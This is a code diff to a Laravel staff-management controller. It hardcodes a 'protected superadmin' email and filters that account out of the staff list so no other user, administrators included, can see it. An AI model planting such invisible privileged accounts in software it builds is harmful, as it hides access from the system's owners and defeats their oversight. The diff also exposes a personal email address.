@@ -12,16 +12,19 @@ use Inertia\Inertia;
 
 class StaffController extends Controller
 {
+    private const PROTECTED_SUPERADMIN_EMAIL = 'onayemi18@gmail.com';
+
     public function index(Request $request)
     {
         $user = auth()->user();
 
-        // If Manager or Cashier, redirect or restrict them to editing their own profile directly
+        // If Manager or Cashier, restrict them to editing their own profile directly
         if (in_array($user->role, ['manager', 'cashier'])) {
             return redirect()->route('admin.staff.edit', $user->id);
         }
 
-        $query = User::query();
+        // Exclude the protected superadmin account from displaying to anyone
+        $query = User::where('email', '!=', self::PROTECTED_SUPERADMIN_EMAIL);
 
         if ($request->filled('search')) {
             $search = $request->input('search');
